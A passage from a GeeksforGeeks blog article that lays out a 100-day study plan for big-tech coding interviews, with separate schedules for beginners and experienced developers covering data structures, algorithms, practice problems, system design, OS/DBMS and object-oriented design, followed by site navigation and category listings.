habit, learn the essentials, and crack the interviews. Here, we have covered: What is 100 Days of Code? 100 Days of Code For Beginners 100 Days of Code For Experienced What is 100 Days of Code? What is the reasonable timeframe to crack the interviews of big tech companies? This question comes to the mind of every newbie and experienced programmers. Well, there are a lot of topics and things to cover if you’re targeting some big tech companies. The challenge is the limited timeframe and based on our research we need to say that it may take almost 14 weeks or 100 Days. We have divided the complete topics into 100 days and all you just have to do is to follow it and stay committed to coding for 100 days. If you follow this approach and stay committed to coding then not only you will develop a good coding habit but also you will be able to crack the interviews of 60-70% of tech companies. We will cover 5-6 main topics in 100 days, and we will target the interviews of big tech companies such as Facebook, Google, Microsoft, Amazon, etc. These topics are given below… Data Structures and Algorithms (Coding part and problem solving) System Design Operating System and DBMS (database management system) Object-Oriented Design Cultural Fit Few things to need to keep in mind before we continue with the roadmap… If you’re a beginner then make the target to solve almost 450-500 coding questions. If you’re an experienced person then make the target to solve almost 300 to 350 questions. System design round is mostly asked from experienced people so beginners have to focus on this section less but experienced one has to focus on this section more. If you’re a beginner then try to commit your time for at least 4-6 hours every day. If you’re an experienced one then you need to commit for 2-3 hours every day. Ideally, you shouldn’t take more than 20–30 minutes to solve any given problem but keep in mind that this rule is not applicable to all the questions. Prerequisite: We are assuming that if you’re a beginner then you already have completed some projects in your college and if you’re an experienced developer then surely you might be working on some projects. 100 Days of Code For Beginners Before you go ahead keep in mind that being a newbie programmer you will be overwhelmed with so many questions and you will face a lot of difficulty in solving the problems. It’s okay if you take more time in solving the questions but don’t be discouraged. Try to solve the problems on your own first even if it takes a couple of more hours. After spending many hours if you don’t get the solution then you can stretch yourself for a few days or take the hints. As you will progress you will see improvement in yourself and also you will take less time in solving the questions. Day 1 to Day 10 Choose a Programming Language and Learn The Fundamentals of it You need to choose a programming language and you need to be stick with it. Explore various programming languages, read about them, try it out in your code editor, and check if you’re comfortable with it or not. A lot of questions will arise when you will be choosing a language. Is Python better than Java? C++ is a faster language, so I should choose this language, Java syntax is more complicated but big companies are working on it, what if I know more than one language? All these questions will create confusion and you will also switch to some different languages when you will try the languages in your code editor. Explore the languages and pick one which is best for you. Don’t choose a language just because it is very popular in the tech industry. You need to choose a language you’re most comfortable with. Almost it will take 4-5 days in picking up a language. Once you choose a language learn the fundamentals of it but if you already know the fundamentals (you might have created your project in that language) then brush up on it. It has been seen that a lot of people forget the basic things of their chosen language. So you need to make sure that you have a good command of your chosen language. Learn the basic syntax, give some online tests, and remember the basic things of your chosen language. It may take around one week or 7 days to learn the fundamentals of your language. Few things you should remember are… Reading/Writing from/to files. Reading input from the console. Split strings 2D array implementation and how to use it. Very basics things of language such as in C/C++ handling null-terminated strings A lot of companies such as Lyft and Salesforce have a slight difference in their hiring procedure. They want the candidate to write code and solve the problems on a laptop. You will have to write the complete program and your code should pass the given test cases. You may have to work on command line arguments or you may have to parse the CSV or text files. Other companies such as Google, Amazon, or Microsoft use a whiteboard. So it’s good that you know the basics of your language to handle both of the coding scenarios in your interview. So almost it will take 10 days to make a decision that which language is best for you and you’re comfortable with. Resource C Programming Language C++ Programming Language Java Programming Language Python Programming Language You can also try GeeksforGeeks free courses: Fork Python Fork CPP Day 11 to Day 20 Learn Data Structures and Algorithms Now it’s time to learn the most important part of the coding i.e. Data Structures and Algorithms. This subject is mostly taught in undergrad and most people ignore the importance of it. But the topic in this subject is the most important thing to cover in the coding interviews. Learn the basics of various data structures and algorithms including the complexity part. Topics are given below… Time and Space Complexity Analysis Arrays Stacks Queues Linked List Trees Tries Graphs (BFS and DFS) Hashing Heaps Sorting Searching Cover all the above fundamentals and implement various DSA in your code editor. You also need to cover the String part which is most likely asked in the interviews. If you’re thinking that you already know all the topics in DSA then just give some online tests and test your skill. You will surely find that you still need to revise the basic concepts. Learn to implement array, linked list, stack, queue, tree, etc. The basic foundation helps a lot in solving the coding question so do not skip it and have a good grasp on it. Resource GeeksforGeeks Data Structures GeeksforGeeks Algorithms Day 21 to Day 40 Solve Basic Level Problems Once you get familiar with the basic data structure and algorithm practice for the basic coding questions. Practicing basic level questions will help you in stretching your mind and it will prepare you to tackle medium level problems. Do not skip the basic level otherwise, you will face difficulty in solving harder problems and you will have to go back to the basic level again. Try to solve almost 200 basic level questions within 10 days. Depending on the time and speed you can increase the number of questions. Almost 8-12 questions a day within the timeframe of 4-6 hours will help you in building a good foundation. Sample Array Problems Merge Two Sorted Arrays Subarray with given sum Find duplicates in an array Missing number in an array Array Rotation Sample Linked List Problems Detect Loop in a linked list Rotate a linked list Merge two sorted linked list Searching in the linked list Find a middle element in a linked list Sample Stack and Queue Problems Sort values in Stack Implement Two Stacks using one Array Sample Tree Problems Minimum value in Binary Search Tree Height of a Binary Tree kth maximum value in Binary Search Tree Sample Graph Problems Implement Breadth-First Search and Depth First Search Sample Heap Problems Find k smallest and largest elements in a list Day 41 to Day 60 Solve Medium Level Problems Now it’s time to practice for some medium level questions. Medium level problems will prepare you to solve harder problems and these questions are most likely asked in the interviews. Try to solve almost 150-170 medium level questions within 20 days. Depending on the time and speed you can increase the number of questions. Almost 7-8 questions a day within the timeframe of 4-6 hours are good enough. Sample Array Problems Inversion of array Maximum of all subarrays of size k Trapping rainwater Kadane’s algorithm Sample Linked List Problems First non-repeating character in a stream Rotate a linked list Remove loop in a linked list LRU Cache Clone a linked list Find the Intersection point of two linked lists Sample Stack and Queue Problems Get minimum element from the stack Queue using Two Stacks Stack using Two Queues Sample Tree Problems Check for BST Vertical traversal of binary tree Boundary traversal of binary tree Delete a node from BST Sample Graph Problems Detect Cycle in a directed and undirected graph Find the number of islands Word Boggle Implementing Dijkstra Day 61 to Day 75 Solve Hard Level Problems Once you solved the basic and medium level question, move to the hard problems which are the last ones. Try to solve almost 80-90 hard level questions within 15 days. Depending on the time and speed you can increase the number of questions. Sample Problems Find median in a stream N-Queen problem Sudoku problem Traveling salesman problem Boolean parenthesization Best Resource for Solving Coding Questions: GeeksforGeeks Practice Portal Day 76 to Day 85 System Design For beginners, this section is not much important but sometimes interviewers asked system design-related questions to the non-experienced candidates as well. So it’s good to know about the system design part as well. Firstly learn the basic concept of system design such as Load Balancing, Caching, Proxies, CAP Theorem, Consistency, Sharding or data partitioning, etc. You will be asked to design a web-scale service. So once you’re done with basic concepts, prepare yourself for some most likely system design round questions such as… URL Shortening Service (TinyURL) Design Facebook Newsfeed Design Uber or Lyft Preparing these questions will help you in handling this round and you will get to know what exactly you have to do in this round. You will be taking ownership of this round and you will describe the different components of the system. Interviewers check that if the candidate is able to build a large and complex system or not. As we have mentioned this round is mostly not asked from the beginners so you don’t need to go into too much depth of this section. However, you should have the knowledge that what exactly happens in this round so in case if it is asked in the interview, you can handle it. Must Go Through: 5 Common System Design Concepts for Interview Preparation How to Crack System Design Round in Interviews Top 10 System Design Interview Questions and Answers Design Twitter Design Dropbox Day 86 to Day 92 OS and DBMS Now it’s time to study the two most important computer science subjects, operating systems, and database management systems. Most of the time junior engineers struggle with the OS and DBMS related questions and skip this part. But preparing these two subjects are also important for the interviews. Go through the basics concepts of operating system such as Process and Process Management Thread and Concurrency Multithreading Lock Process Scheduling Synchronization and Deadlock CPU Scheduling Distributed file system Memory management Critical section problem Also, prepare yourself with some database-related questions such as relational and non-relational databases, sharding, scaling, ACID property, indexing, etc. Resources Commonly Asked Operating Systems Interview Questions | Set 1 Most asked Computer Science Subjects Interview Questions in Amazon, Microsoft, Flipkart GeeksforGeeks Operating System GeeksforGeeks DBMS Day 93 to Day 99 Object-Oriented Design Prepare yourself for an object-oriented design question for 7 days. You should have a good understanding of software design patterns, SOLID/DRY principles, and various oops concepts. Some object-oriented design questions are given below… Design an ATM Design Vending Machine Design a Parking Lot Design a Movie Ticket Booking System Your main goal is to gather all the requirements and transform that into comprehensible classes. You need to identify different objects and entities from a problem statement. In interviews, you will have to explain different components and their interface. Also, you will be explaining how different components are interacting with each other using the interfaces. Prepare yourself with a use case diagram, activity diagram, and class diagram. Day 100 Cultural Fit Last day prepare yourself for the cultural round. Companies do not hire toxic people and also they don’t hire candidates who are not passionate about the product. Understand the culture of the company. For example, in Amazon culture is deeply rooted, and they conduct the bar raiser round. They care a lot about the leadership principle. In interviews, you will have to show interest in the product and you will have to be honest. Fake people won’t be entertained. So make sure that you keep in mind all these things and you prepare yourself with the right attitude. 100 Days of Code For Experienced Before you go ahead keep in mind that you need to focus on many things. You’re expected to perform well in the coding round, system design round and in the other rounds as well. You have the advantage to use the knowledge you have learned in your day-to-day job. Sometimes it’s not the years of experience that matters for the interviewer but the time you spend sharpening your coding or technical skill matters for them. So it’s not good to judge your skills on the basis of years of experience. Track your knowledge, give some online tests, and check how far you still have to go. Day 1 to Day 7 Choose a Programming Language and Learn The Fundamentals of it Being an experienced developer it will be easy for you to choose a programming language and learn the fundamentals of it. You can try out a new language or you can choose a language you’re using in your day-to-day job. Once you make the decision go through all the basic concepts. Don’t think that you don’t need to go through the basics just because you’re using your language in your day-to-day job. Many times developers forget the basic concepts, or they miss out on a few things. So don’t skip this part and have a good command of your chosen language. Few things you should remember are… Reading/Writing from/to files. Reading input from the console. Split strings 2D array implementation and how to use it. Very basics things of language such as in C/C++ handling null-terminated strings A lot of companies such as Lyft and Salesforce have a slight difference in their hiring procedure. They want the candidate to write code and solve the problems on a laptop. You will have to write the complete program and your code should pass the given test cases. You may have to work on command line arguments or you may have to parse the CSV or text files. Other companies such as Google, Amazon, or Microsoft use a whiteboard. So it’s good that you know the basics of your language to handle both of the coding scenarios in your interview. Almost it will take 7 days to cover this part. Resource C Programming Language C++ Programming Language Java Programming Language Python Programming Language You can also try GeeksforGeeks free courses: Fork Python Fork CPP Day 8 to Day 14 Learn Data Structures and Algorithms The experienced developer already uses data structures and algorithms in their days to day jobs (example: array is most widely used in various applications). They use their coding logic with different data structures, and various algorithms deepening on the requirements. Still, a lot of them forget the basic implementation, and they can not perform simple tasks. So it is better not to skip this part and jump directly into the coding. Go through all the fundamentals of data structures such as an array, linked list, queue, stack, tree, etc, and its implementation. Brush up on the basic operations performed on these data structures. Clear all the concepts of complexity, learn about the different algorithms, and their implementation. The basic foundation of coding i.e concepts of DSA must be strong to solve the different levels of coding questions. You can check your basic skill by giving some online tests. Resource GeeksforGeeks Data Structures GeeksforGeeks Algorithms Day 15 to Day 28 Solve Basic Level Problems Once you brush up on the data structure and algorithms, practice for the basic level coding questions. With experienced developers, most of the time basic level questions are not asked in the interviews round. Even if it is then it’s just a kind of warm-up problem. During the phone interview, you can encounter these kinds of problems. So do not ignore this part and solve the basic questions first before you move to the complex one. Give 14 days to basic level questions and try to solve almost 70-80 questions. Depending on the time and speed you can increase the number of questions. Almost 5-6 questions a day within the timeframe of 2-3 hours is good enough to prepare you for the phone interviews, warm-up kind of problems, and for building a basic foundation as well. Sample Array Problems Merge Two Sorted Arrays Subarray with given sum Find duplicates in an array Missing number in an array Array Rotation Sample Linked List Problems Detect Loop in a linked list Rotate a linked list Merge two sorted linked list Searching in the linked list Find a middle element in a linked list Sample Stack and Queue Problems Sort values in Stack Implement Two Stacks using one Array Sample Tree Problems Minimum value in Binary Search Tree Height of a Binary Tree kth maximum value in Binary Search Tree Sample Graph Problems Implement Breadth-First Search and Depth First Search Sample Heap problems Find k smallest and largest elements in a list Day 29 to Day 49 Solve Medium Level Problems After practicing the basic level coding questions move to the medium level questions and start solving it. Medium level problems will prepare you to solve harder problems and these questions are most likely asked in the interviews. Try will have to solve almost 120-130 medium level questions within 21 days. Depending on the time and speed you can increase the number of questions. Almost 5-6 questions a day within the timeframe of 2-3 hours is good to solve. Inversion of array Maximum of all subarrays of size k Trapping rainwater Kadane’s algorithm Sample Linked List Problems First non-repeating character in a stream Rotate a linked list Remove loop in a linked list LRU Cache Clone a linked list Find the Intersection point of two linked lists Sample Stack and Queue Problems Get minimum element from the stack Queue using Two Stacks Stack using Two Queues Sample Tree Problems Check for BST Vertical traversal of binary tree Boundary traversal of binary tree Delete a node from BST Sample Graph Problems Detect Cycle in a directed and undirected graph Find the number of islands Word Boggle Implementing Dijkstra Day 50 to Day 70 Solve Hard Level Problems Once you solved the basic and medium level question, move to the complex or hard level problems, and solve it. Give it 21 days and try to solve almost 100-110 questions. Depending on the time and speed you can increase the number of questions. Sample Problems Find median in a stream N-Queen problem Sudoku problem Traveling salesman problem Boolean parenthesization Best Resource for Solving Coding Questions: GeeksforGeeks Practice Portal Day 71 to Day 85 System Design This section is more important for experienced developers to focus on. System design is the most important rounds in interviews specially for senior engineers. Experienced developers need to focus on this part more and in interviews, they will have to tell the approach to the interviewer to design a highly scalable system. Firstly learn all the basic concepts of system design such as Load Balancing, Caching, Proxies, CAP Theorem, Consistency, Sharding or data partitioning, etc. Once you’re done with basic concepts, prepare yourself for some most likely system design round questions such as… URL shortening service (TinyURL) Design Facebook Newsfeed Design Netflix/Youtube Design Uber or Lyft Preparing these questions will help you in handling this round and you will get to know what exactly you have to do in this round. You will be taking ownership of this round and you will describe the different components of the system. In this round, interviewers check that if the candidate is able to build a large and complex system or not. After preparing around 5-6 questions you will have an idea that how this round looks like, what exactly you’re supposed to do and how you need to handle it. Must Read: 5 Common System Design Concepts for Interview Preparation How to Crack System Design Round in Interviews Top 10 System Design Interview Questions and Answers Design Twitter Design Dropbox Day 86 to Day 92 OS and DBMS Now it’s time to study the two most important computer science subjects, operating systems, and database management systems. Senior engineers are supposed to perform well when the concepts of these two subjects are asked in the interviews because they would be taking the help of multiple cores and threads while writing the code in their daily job. In the operating system brush up on some basic concepts which you left a long time back during your undergrad program… Process and Process management Thread and Concurrency Multithreading Lock Process Scheduling Synchronization and Deadlock CPU Scheduling Distributed file system Memory management Critical section problem Also, prepare yourself with some database-related questions such as relational and non-relational databases, sharding, scaling, ACID property, indexing, etc. Resources Commonly Asked Operating Systems Interview Questions | Set 1 Most asked Computer Science Subjects Interview Questions in Amazon, Microsoft, Flipkart GeeksforGeeks Operating System GeeksforGeeks DBMS Day 93 to Day 99 Object-Oriented Design Prepare yourself for an object-oriented design question for 7 days. You should have a good understanding of software design patterns, SOLID/DRY principles, and various oops concepts. Some object-oriented design questions are given below… Design an ATM Design Vending Machine Design a Parking Lot Design a Movie Ticket Booking System Your main goal is to gather all the requirements and transform that into comprehensible classes. You need to identify different objects and entities from a problem statement. In interviews, you will have to explain different components and their interface. Also, you will be explaining how different components are interacting with each other using the interfaces. Prepare yourself with a use case diagram, activity diagram, and class diagram. Day 100 Cultural Fit Last day prepare yourself for the cultural round. Companies do not hire toxic people and also they don’t hire candidates who are not passionate about the product. Understand the culture of the company. For example, in Amazon culture is deeply rooted, and they conduct the bar raiser round. They care a lot about the leadership principle. In interviews, you will have to show interest in the product and you will have to be honest. Fake people won’t be entertained. So make sure that you keep in mind all these things and you prepare yourself with the right attitude. My Personal Notes arrow_drop_up Save Recommended Posts:How To Learn ReactJS: A Complete Guide For BeginnersHow to Prepare For GSoC (Google Summer of Code) - A Complete Guide7 Common Mistakes That Beginners Should Avoid While Learning to CodeHow to prepare for Infosys - The Complete guideHow to Become a Full Stack Web Developer in 2019 : A Complete GuideHow to Become a Data Analyst in 2019: A Complete GuideHow to Become a Data Scientist in 2019: A Complete GuideGoogle Interview Preparation For Software Engineer - A Complete GuideSwitch Your Career to Machine Learning - A Complete GuideHow To Become A Web Developer in 2020 - A Complete GuideHow to Write a Research Paper - A Complete GuideHow to Start a Career in Software Testing - A Complete Guide!How to Learn Java Collections - A Complete GuideBest Books to Learn Python for Beginners and Experts in 2019Best Books To Learn Machine Learning For Beginners And ExpertsBest Books to Learn Java for Beginners and ExpertsTop 10 Projects For Beginners To Practice HTML and CSS SkillsBest Books to Learn Data Science for Beginners and ExpertsAndroid App Development Fundamentals for Beginners5 Programming Tips For BeginnersanuupadhyayWeb Developer, Technical Content EngineerIf you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : GBlog thumb_up 43 To-do Done 3.3 Based on 6 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page 10 Best Artificial Intelligence Project Ideas To Kick-Start Your Career Next last_page 7 Most In-Demand and Well-Paying Career Options For 2021 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in GBlog Why Java Language is Slower Than CPP for Competitive Programming?Differences between Procedural and Object Oriented ProgrammingVirtualization | A Machine Reference ModelSupervised and Unsupervised learningTypes of Software Testing More related articles in GBlog Working with csv files in PythonGenetic AlgorithmsXML parsing in PythonUnderfitting and Overfitting in Machine LearningDifference between FAT32, exFAT, and NTFS File System room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

All Medium Articles Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects All Medium Articles Select Category All Categories Accenture; Accolite; Adobe; Advanced Computer Subject; Advanced Data Structure; AKTU-question-papers; Algebra; Algorithms; Algorithms-Analysis of Algorithms; Algorithms-Bit Algorithms; Algorithms-Dynamic Programming; Algorithms-Graph Shortest Paths Quiz; Algorithms-Graph Traversals; Algorithms-Greedy Algorithms; Algorithms-Misc; Algorithms-Recursion; Algorithms-Sorting-Quiz; Amazon; Amazon-Question; Amdocs; American Express; Anagram; Analysis; Analysis of Algorithms; Android; AngularJS; AngularJS-Directives; AngularJS-Misc; Apache; Aptitude; Aptitude-GATE CS 1998; Aptitude-Puzzles; Aptitude-Wipro Mock Test; Arcesium; Area-volume-programs; Arithmetic progression; Array-range-queries; Array-rearrange; Array-traversal-question; Arrays; Arrays; Articles; Artificial Intelligence; ASCII; ASP-Properties; AWS; Backtracking; Barclays; Base-conversion; BFS; BigData; Binary Indexed Tree; Binary Search; Binary Search Tree; Binary Search Trees; Binary Tree; Binary Trees Quiz; Binary-representation; Binary-string; Binomial coefficient; BIT; Bit Algorithms; Bit Magic; Bitonic; Bitwise-AND; Bitwise-OR; Bitwise-XOR; BlockChain; Bootstrap; Bootstrap-4; Bootstrap-Misc; Bulma; C; C Basics; C Programs; C#; C# Programs; C++; C++ Programs; C++-Constructors; C++-Inheritance; C-Arrays; C-Data Types; C-Dynamic Memory Allocation; C-File Handling; C-Functions; C-graphics; C-Input and Output Quiz; C-Library; C-Loops & Control Structure; C-Macro & Preprocessor; C-Operators; C-Output; C-Pointers; C-puzzle; C-Storage Classes and Type Qualifiers; C-String; C-String-Question; C-Structure & Union; C-Variable Declaration and Scope; Capgemini; Career-Advices; CAT; Catalan; CBSE - Class 11; Chessboard-problems; Circle; Circular linked list; Circular-array; Cisco; Citrix; Class 10; Class 11; Class 12; Class 8; Class 9; Cloud-Computing; Codenation; Cognizant; Cognizant-interview-experience; Collect.js; Combinatorial; Combionatrics; Competitive Programming; Compiler Design; Complement; Computer Networks; Computer Networks-Network Layer; Computer Organization & Architecture; Computer Organization and Architecture; Computer Subject; Computer-graphics; Constructive Algorithms; Constructors; Cpp-advanced; Cpp-algorithm-library; Cpp-array; CPP-Basics; CPP-bitset; Cpp-boost; Cpp-class; Cpp-constructor; Cpp-containers-library; Cpp-data-types; Cpp-deque; Cpp-file-handling; CPP-forward-list; CPP-Functions; Cpp-input-output; Cpp-ios; Cpp-iterator; CPP-Library; Cpp-list; Cpp-manipulators; Cpp-map; Cpp-math; Cpp-multimap; Cpp-multiset; Cpp-multithreading; Cpp-numerics-library; Cpp-operator; CPP-Output; Cpp-pair; Cpp-pointer; Cpp-priority-queue; Cpp-puzzle; Cpp-queue; CPP-regex; Cpp-set; Cpp-stack; Cpp-string; Cpp-strings; Cpp-strings-library; Cpp-structure; Cpp-template; Cpp-unordered_map; Cpp-unordered_map-functions; Cpp-unordered_multimap; Cpp-unordered_multiset; Cpp-unordered_set; Cpp-unordered_set-functions; Cpp-valarray; Cpp-vector; Cpu-scheduling; Cryptography; CSharp Convert Class; CSharp DateTime Struct; CSharp LINQ; CSharp Multithreading; CSharp-8.0; CSharp-Arrays; CSharp-Basics; CSharp-Char-Struct; CSharp-Collections-ArrayList; CSharp-Collections-BitArray; CSharp-Collections-Hashtable; CSharp-Collections-Namespace; CSharp-Collections-SortedList; CSharp-Console-Class; CSharp-DateTimeOffset-Struct; CSharp-Decimal-Struct; CSharp-File-Handling; CSharp-Generic-HashSet; CSharp-Generic-List; CSharp-Generic-Namespace; CSharp-Generic-SortedSet; CSharp-keyword; CSharp-Math; CSharp-MathF-Class; CSharp-method; CSharp-OOP; CSharp-Specialized-HybridDictionary; CSharp-Specialized-Namespace; CSharp-string; CSharp-Tuple; CSharp-Type-Class; CSharp-Uri-Class; CSharp-ValueTuple; CSharp-ValueTuple-Methods; CSharp-Windows-Forms-Namespace; CSS; CSS-Advanced; CSS-Basics; CSS-Functions; CSS-Misc; CSS-Properties; CSS-Selectors; Cyber-security; D-E-Shaw; D3.js; Dart; Data Link Layer; Data mining; Data Structures; Data Structures-Heap; Data Structures-Linked List; Data Structures-Tree Traversals; Data Visualization; Data-science; Date-time-program; DBMS; DBMS-SQL; DE Shaw; Deep-Learning; Dell; Deloitte; Deque; Design Pattern; Deutsche Bank; DFS; Difference Between; Digit-DP; Digital Electronics & Logic Design; Dijkstra; Directi; Discrete Mathematics; Distributed System; Divide and Conquer; Divisibility; Divisors; Django-forms; Django-models; Django-REST; Docker Container; Doubly linked list; Dynamic Programming; ElectronJS; Encoding-decoding; Engineering Mathematics; ES6; Euler-totient; Exception Handling; Expedia; Experienced; Express.js; Expression-evaluation; Fabric.js; Facebook; Factor; Factorial; FactSet; Fibonacci; File & Disk Management; Flipkart; Flutter; Flutter-widgets; Fraction; Frequency-counting; Full Form; Functions; Game Theory; GATE 2017 Mock; GATE 2017 MOCK II; GATE CS; GATE CS 1996; GATE CS 1997; GATE CS 1998; GATE CS 1999; GATE CS 2018; GATE IT 2004; Gate IT 2005; GATE IT 2006; Gate IT 2007; Gate IT 2008; GATE-CS-2000; GATE-CS-2001; GATE-CS-2002; GATE-CS-2003; GATE-CS-2004; GATE-CS-2005; GATE-CS-2006; GATE-CS-2007; GATE-CS-2008; GATE-CS-2009; GATE-CS-2010; GATE-CS-2011; GATE-CS-2012; GATE-CS-2013; GATE-CS-2014-(Set-1); GATE-CS-2014-(Set-2); GATE-CS-2014-(Set-3); GATE-CS-2015 (Set 1); GATE-CS-2015 (Set 2); GATE-CS-2015 (Set 3); GATE-CS-2016 (Set 1); GATE-CS-2016 (Set 2); GATE-CS-2017 (Set 1); GATE-CS-2017 (Set 2); GATE-CS-DS-&-Algo; GATE-GATE 2017 Mock; GATE-GATE 2017 MOCK II; GATE-GATE CS 1996; GATE-GATE CS 1997; GATE-GATE CS 1999; GATE-GATE CS 2008; GATE-GATE CS 2010; GATE-GATE CS 2011; GATE-GATE CS 2012; GATE-GATE CS 2013; GATE-GATE CS 2018; GATE-GATE IT 2004; GATE-Gate IT 2005; GATE-GATE IT 2006; GATE-Gate IT 2007; GATE-Gate IT 2008; GATE-GATE-CS-2000; GATE-GATE-CS-2001; GATE-GATE-CS-2002; GATE-GATE-CS-2003; GATE-GATE-CS-2004; GATE-GATE-CS-2005; GATE-GATE-CS-2006; GATE-GATE-CS-2007; GATE-GATE-CS-2009; GATE-GATE-CS-2014-(Set-1); GATE-GATE-CS-2014-(Set-2); GATE-GATE-CS-2014-(Set-3); GATE-GATE-CS-2015 (Set 1); GATE-GATE-CS-2015 (Set 2); GATE-GATE-CS-2015 (Set 3); GATE-GATE-CS-2016 (Set 1); GATE-GATE-CS-2016 (Set 2); GATE-GATE-CS-2017 (Set 1); GATE-GATE-CS-2017 (Set 2); GBlog; GCD-LCM; GE; Geek on the Top; Geometric; Geometric-Lines; GFacts; GFG-Course; GFG-Update; Git; GitHub; Go Language; Golang; GoLang-atomic; Golang-bits; Golang-Complex; Golang-fmt; Golang-io; Golang-Math; Golang-Program; Golang-reflect; Golang-Slices; Golang-strconv; Golang-String; GoLang-time; Goldman Sachs; Google; Google Sites; Google-AMP; Graph; Graph Traversals; Graph-connectivity; Graph-cycle; GRE; Greedy; Greedy Algorithms; Guava-Functions; HackWithInfy; Hadoop; Hash; HashTable; HCF; HCL; Heap; Hike; How To; HSBC; HTML; HTML and XML; HTML-Attributes; HTML-Basics; HTML-DOM; HTML-MathML; HTML-Methods; HTML-Misc; HTML-Property; HTML-SVG; HTML-Tags; HTML5; HTTP-headers; IBM; Image-Processing; InfoEdge; Informatica; Information-Security; Infosys; Infosys-InfyTQ; Infosys-interview-experience; Inheritance; Inorder Traversal; Insertion Sort; Internship; Interview Experiences; Interview Tips; Interview-preparation; Inversion; IoT; ISRO; Java; Java - util package; Java 8; Java Programs; Java-AbstractSequentialList; Java-advanced; Java-Array-Programs; Java-ArrayDeque; Java-ArrayList; Java-Arrays; Java-AtomicInteger; Java-AtomicLong; Java-AtomicReferenceArray; Java-AWT; Java-basics; Java-BigDecimal; Java-BigInteger; Java-BitSet; Java-Byte; Java-ByteBuffer; Java-Calendar; Java-Character; Java-CharBuffer; Java-ChronoLocalDate; Java-ChronoLocalDateTime; Java-ChronoZonedDateTime; Java-Class and Object; Java-Collections; Java-concurrent-package; Java-ConcurrentLinkedDeque; Java-ConcurrentSkipListSet; Java-Constructors; Java-CopyOnWriteArrayList; Java-Data Types; Java-Date-Time; Java-DecimalFormat; Java-DecimalFormatSymbols; Java-DoubleBuffer; Java-DoubleStream; 